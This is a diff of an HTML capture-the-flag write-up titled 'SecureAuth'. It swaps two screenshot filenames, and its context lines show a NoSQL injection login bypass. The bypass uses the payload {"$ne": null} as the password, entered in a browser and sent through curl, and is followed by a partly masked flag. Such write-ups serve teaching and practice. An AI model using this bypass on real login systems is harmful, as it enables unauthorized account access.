@@ -202,7 +202,7 @@
 
     <h2>1. Initial Login Page</h2>
     <p>We’re greeted by a JSON-based login form. The <code>Content-Type: application/json</code>AKA, NoSQL Injection.</p>
-    <img src="Pic/SecureAuth/6.png" alt="Login page">
+    <img src="Pic/SecureAuth/7.png" alt="Login page">
 
     <p>Tried the classic NoSQLi payload in the browser:</p>
     <pre><code>Username: admin
@@ -230,7 +230,7 @@ Password: {"$ne": null}</code></pre>
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":{"$ne":null},"remember":"false"}'</code></pre>
 
-    <img src="Pic/SecureAuth/7.png" alt="cURL success">
+    <img src="Pic/SecureAuth/6.png" alt="cURL success">
 
     <div class="flag">
       FLAG(py7h0n_****}
